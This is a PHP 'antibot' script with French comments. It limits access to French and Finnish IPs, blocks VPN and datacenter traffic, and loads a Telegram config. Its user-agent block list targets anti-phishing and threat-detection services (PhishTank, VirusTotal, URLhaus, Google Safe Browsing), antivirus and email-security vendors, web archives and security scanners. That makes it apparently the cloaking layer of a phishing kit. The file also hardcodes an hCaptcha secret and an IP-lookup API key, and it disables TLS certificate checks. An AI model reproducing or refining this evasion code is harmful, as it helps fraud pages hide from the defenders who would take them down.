<?php
/**
 * Security & Antibot System v7 - EXTENDED CRAWLERS LIST
 * Pays: FI, FR uniquement
 * Bloque bots, VPN, proxy, datacenter
 * Système CAPTCHA hCaptcha pour IP suspectes
 * Vérifie à CHAQUE page (pas de cache)
 * LISTE EXHAUSTIVE DE CRAWLERS & BOTS
 */

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Config Telegram
require_once dirname(__DIR__) . '/config.php';

// ── CONFIG CAPTCHA ────────────────────────────────────────────
define('HCAPTCHA_SITE_KEY', 'e626ae96-b980-415e-a1d0-5f6ad926e30c'); // À remplacer
define('HCAPTCHA_SECRET_KEY', 'ES_b2f3fb5406c646a78f18d60a7813a239'); // À remplacer
define('CAPTCHA_TIMEOUT', 600); // 10 minutes

// Pays autorisés
$allowedCountries = ['FI', 'FR'];

// ── BOTS À BLOQUER - LISTE EXHAUSTIVE ─────────────────────────
$botPatterns = [
    // Search Engines & Crawlers
    'googlebot', 'google-extended', 'bingbot', 'yandexbot', 'yandex', 'baidu', 'baiduspider',
    'slurp', 'duckduckbot', 'duckduck', 'sogou', 'exabot', 'facebot', 'applebot',
    'bingpreview', 'crawler', 'spider', 'bot/', 'crawl', 'scraper',
    
    // SEO & Analytics Bots
    'semrush', 'ahrefs', 'ahrefsbot', 'mj12bot', 'dotbot', 'rogerbot', 'screaming',
    'sistrix', 'majestic', 'netpeak', 'spyfu', 'similarweb', 'hubspot', 'ghostery',
    'brandwatch', 'contently', 'uptimerobot', 'pingdom', 'gtmetrix', 'monitor.io',
    'statuscake', 'neustar', 'catchpoint', 'apptio', 'servicenow', 'dynatrace',
    'newrelic', 'datadog', 'elastic', 'logstash', 'splunk',
    
    // Social Media Bots
    'facebookexternalhit', 'fbexternalhit', 'twitterbot', 'linkedinbot', 'pinterestbot',
    'pinterest', 'slackbot', 'discordbot', 'tumblr', 'vkshare', 'whatsapp', 'telegrambot',
    'viber', 'skype', 'line', 'messenger', 'snapchat',
    
    // AI & ML Bots
    'gptbot', 'chatgpt', 'claude', 'claude-web', 'ccbot', 'anthropic', 'openai',
    'bytespider', 'bytedance', 'mediavine', 'apptentive', 'techweavers',
    'petalbot', 'baidunetwork', 'sogouspider', 'msnbot', 'amazonbot', 'verticalcrawl',
    
    // Security & Vulnerability Scanning
    'nessus', 'nikto', 'nmap', 'sqlmap', 'wpscan', 'acunetix', 'qualys', 'rapid7',
    'tenable', 'censys', 'shodan', 'masscan', 'zap', 'burp', 'nessusbot',
    'securityheaders', 'ssltest', 'ssllabs', 'certly', 'urlscan',
    
    // Headless Browsers & Automation Tools
    'headless', 'phantom', 'phantomjs', 'selenium', 'webdriver', 'puppeteer', 'playwright',
    'cypress', 'nightwatch', 'webdriverio', 'testcafe', 'protractor',
    
    // HTTP Clients & Request Libraries
    'curl/', 'curl', 'wget/', 'wget', 'lynx', 'links', 'elinks',
    'java/', 'httpclient', 'okhttp', 'requests', 'urllib', 'httpx',
    'python-requests', 'aiohttp', 'perl', 'ruby', 'node-fetch',
    
    // Web Crawlers & Scrapers
    'scrapy', 'scrapy-splash', 'beautifulsoup', 'selenium', 'webui', 'heritrix',
    'nutch', 'crawler4j', 'webcollage', 'web-im-archiver', 'httrack',
    'webmirror', 'offline-browser', 'sitesucker', 'black-widow', 'getleft',
    'webreaper', 'website-ripper', 'batch-link-downloader', 'getsite', 'winhttrack',
    
    // Archive & Wayback
    'archive.org', 'archive.is', 'wayback', 'waybackmachine', 'archiveit',
    'perma.cc', 'memento', 'uk.webarchive.org.uk',
    
    // Monitoring & UX Tools
    'userreplay', 'fullstory', 'hotjar', 'crazyegg', 'contentsquare', 'sessioncam',
    'logrocket', 'sentry', 'rollbar', 'raygun', 'errorception', 'trackjs',
    'ghostinspector', 'browserstack', 'lambdatest', 'sauce', 'perfecto', 'testproject',
    
    // Email & Link Verification
    'emailvalidation', 'linkchecker', 'email-validator', 'url-verifier', 'link-verifier',
    'mail-tester', 'greymail', 'forcepoint', 'proofpoint', 'mimecast',
    
    // Traffic Analysis & Fingerprinting
    'fingerprint', 'devicedetect', 'user-agent-parser', 'analytics', 'mixpanel',
    'amplitude', 'segment', 'keen', 'rudderstack', 'treasure-data',
    
    // Malware & Threat Detection
    'malwarebytes', 'kaspersky', 'mcafee', 'norton', 'bitdefender', 'avast', 'avg',
    'clamav', 'virustotal', 'urlhaus', 'phishtank', 'google-safe-browsing',
    'legitscript', 'webdefence', 'zscaler', 'cloudflare-waf',
    
    // Miscellaneous Bots
    'mediapartners', 'adsbot', 'adidxbot', 'feedfetcher', 'feedvalidator',
    'metauri', 'metauri.com', 'megaindex', 'seositecheckup', 'woorank',
    'seoprofiler', 'se-ranking', 'spyderbot', 'infohelios', 'compat-mode',
    'whizbang', 'libwww', 'lynx-secure', 'edbrowse', 'w3c', 'validator',
    'check.w3c.org', 'checklink', 'htmlvalidator', 'cssvalidator',
    'grammarly', 'copyscape', 'turnitin', 'plagiarism', 'paraphrase',
    
    // Chinese & Asian Crawlers
    'ivechen', 'qhspider', 'sogouspider', 'oozbot', 'soslowbot', 'jike',
    'webot', 'xiasouspider', 'iqiyi', 'iaskspider', 'sosospider', 'msn',
    
    // Real Estate & Price Monitoring
    'magusbot', 'postman', 'insomnia', 'restclient', 'thunderclient',
    'pricegrabber', 'dealtime', 'shopzilla', 'bizrate',
    
    // Custom/Suspicious Agents
    'bot', 'agent', 'client', 'tool', 'script', 'automation', 'parser', 'fetcher',
    'downloader', 'sniffer', 'sniper', 'scanner', 'probe', 'hunter', 'mapper',
    'tracer', 'analyzer', 'inspector', 'monitor', 'watcher', 'observer'
];

// ── FONCTIONS ─────────────────────────────────────────────────

/**
 * Bloquer l'accès complètement
 */
function blockAccess($reason) {
    $_SESSION['security_passed'] = false;
    $_SESSION['block_reason'] = $reason;
    @file_put_contents(__DIR__ . '/logs/blocked.log',
        date('Y-m-d H:i:s') . " | " . ($_SERVER['REMOTE_ADDR'] ?? '') . " | $reason\n",
        FILE_APPEND
    );
    header('Location: /?s=e&r=' . urlencode($reason));
    exit;
}

/**
 * Demander CAPTCHA
 */
function requireCaptcha($reason) {
    // Si déjà passé le CAPTCHA récemment (10 min), OK
    if (!empty($_SESSION['captcha_passed']) && !empty($_SESSION['captcha_passed_time'])) {
        if ((time() - $_SESSION['captcha_passed_time']) < CAPTCHA_TIMEOUT) {
            return false; // Pas besoin de CAPTCHA
        }
    }

    $_SESSION['captcha_reason'] = $reason;
    $_SESSION['captcha_redirect'] = basename($_SERVER['PHP_SELF']);
    $_SESSION['captcha_ip'] = getRealIP();
    $_SESSION['captcha_token'] = bin2hex(random_bytes(32));

    @file_put_contents(__DIR__ . '/logs/captcha_required.log',
        date('Y-m-d H:i:s') . " | " . getRealIP() . " | $reason\n",
        FILE_APPEND
    );

    header('Location: /?s=v');
    exit;
}

/**
 * Obtenir IP réelle
 */
function getRealIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    }
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        return $_SERVER['HTTP_X_REAL_IP'];
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

/**
 * Vérifier CAPTCHA hCaptcha
 */
function verifyCaptcha($token) {
    if (empty($token)) {
        return ['success' => false, 'error' => 'Token vide'];
    }

    $ch = curl_init('https://hcaptcha.com/siteverify');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'secret' => HCAPTCHA_SECRET_KEY,
            'response' => $token
        ]),
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10
    ]);

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        @file_put_contents(__DIR__ . '/logs/captcha_error.log',
            date('Y-m-d H:i:s') . " | CAPTCHA API Error: $error\n",
            FILE_APPEND
        );
        return ['success' => false, 'error' => 'API Error'];
    }

    $data = json_decode($response, true);
    return [
        'success' => ($data['success'] ?? false) === true,
        'score' => $data['score'] ?? 0,
        'error_codes' => $data['error-codes'] ?? []
    ];
}

/**
 * Évaluer le risque d'une IP
 */
function assessIPRisk($data) {
    $risk = 0;
    $reasons = [];

    // Datacenter = très suspect
    if (!empty($data['hosting']) && $data['hosting'] === true) {
        $risk += 40;
        $reasons[] = 'hosting';
    }

    // VPN/Proxy = suspect
    if (!empty($data['proxy']) && $data['proxy'] === true) {
        $risk += 30;
        $reasons[] = 'vpn';
    }

    // Mobile = léger risque
    if (!empty($data['mobile']) && $data['mobile'] === true) {
        $risk += 5;
        $reasons[] = 'mobile';
    }

    // ISP inconnu = risque
    if (empty($data['isp']) || strlen($data['isp']) < 3) {
        $risk += 15;
        $reasons[] = 'unknown_isp';
    }

    // ASN privé = risque
    if (!empty($data['asn']) && stripos($data['asn'], 'private') !== false) {
        $risk += 20;
        $reasons[] = 'private_asn';
    }

    return ['risk_score' => $risk, 'reasons' => $reasons];
}

// ── VÉRIFICATIONS ─────────────────────────────────────────────

$userIP = getRealIP();

// Localhost = OK sans vérification
if (in_array($userIP, ['127.0.0.1', '::1', 'localhost'])) {
    $_SESSION['security_passed'] = true;
    return;
}

// Cache 2 min - mais seulement si même IP
if (!empty($_SESSION['security_passed']) && !empty($_SESSION['last_ip'])) {
    if ($_SESSION['last_ip'] === $userIP && (time() - ($_SESSION['security_time'] ?? 0)) < 120) {
        return;
    }
}

// Créer antibotplot (toujours)
if (empty($_SESSION['antibotplot'])) {
    $_SESSION['antibotplot'] = bin2hex(random_bytes(16));
}

// Vérifier User-Agent (bots connus = BLOCAGE IMMÉDIAT)
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!empty($userAgent)) {
    $uaLower = strtolower($userAgent);
    foreach ($botPatterns as $pattern) {
        if (strpos($uaLower, $pattern) !== false) {
            blockAccess('bot');
        }
    }
}

// ── APPEL API IP-API ──────────────────────────────────────────
$apiUrl = "https://pro.ip-api.com/json/{$userIP}?key=NCx0PDVOcBsh1pQ&fields=66846719";
$ch = curl_init($apiUrl);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 10,
    CURLOPT_CONNECTTIMEOUT => 5
]);

$response = curl_exec($ch);
$curlError = curl_error($ch);
curl_close($ch);

$data = @json_decode($response, true);

// Si API échoue = CAPTCHA requis (suspect)
if (!$data || ($data['status'] ?? '') !== 'success') {
    @file_put_contents(__DIR__ . '/logs/api_errors.log',
        date('Y-m-d H:i:s') . " | $userIP | API Error: $curlError\n",
        FILE_APPEND
    );
    requireCaptcha('api_error');
}

// ── VÉRIFICATIONS STRICTES ────────────────────────────────────

// 1. PAYS: FR ou FI uniquement = BLOCAGE
if (!in_array($data['countryCode'] ?? '', $allowedCountries)) {
    blockAccess('country_' . ($data['countryCode'] ?? 'unknown'));
}

// 2. VPN/PROXY: BLOCAGE IMMÉDIAT
if (!empty($data['proxy']) && $data['proxy'] === true) {
    blockAccess('vpn');
}

// 3. HOSTING/DATACENTER: BLOCAGE IMMÉDIAT
if (!empty($data['hosting']) && $data['hosting'] === true) {
    blockAccess('hosting');
}

// ── ÉVALUATION DU RISQUE ──────────────────────────────────────
$riskAssessment = assessIPRisk($data);
$riskScore = $riskAssessment['risk_score'];

// Stocker infos IP
$_SESSION['ip_info'] = [
    'ip' => $userIP,
    'city' => $data['city'] ?? '',
    'country' => $data['country'] ?? '',
    'countryCode' => $data['countryCode'] ?? '',
    'isp' => $data['isp'] ?? '',
    'asn' => $data['asn'] ?? '',
    'mobile' => $data['mobile'] ?? false,
    'proxy' => $data['proxy'] ?? false,
    'hosting' => $data['hosting'] ?? false,
    'risk_score' => $riskScore,
    'risk_reasons' => $riskAssessment['reasons']
];

// === LOGIQUE CAPTCHA ===
// Si risque MOYEN (15-50) ou ÉLEVÉ (50+) = CAPTCHA
if ($riskScore >= 15) {
    requireCaptcha('suspicious_ip_' . $riskScore);
}

// === TOUT OK ===
$_SESSION['security_passed'] = true;
$_SESSION['security_time'] = time();
$_SESSION['last_ip'] = $userIP;

// Log accès autorisé
@file_put_contents(__DIR__ . '/logs/access.log',
    date('Y-m-d H:i:s') . " | $userIP | " . 
    ($data['countryCode'] ?? 'XX') . " | " . 
    ($data['isp'] ?? 'Unknown') . " | Risk: $riskScore\n",
    FILE_APPEND
);
?>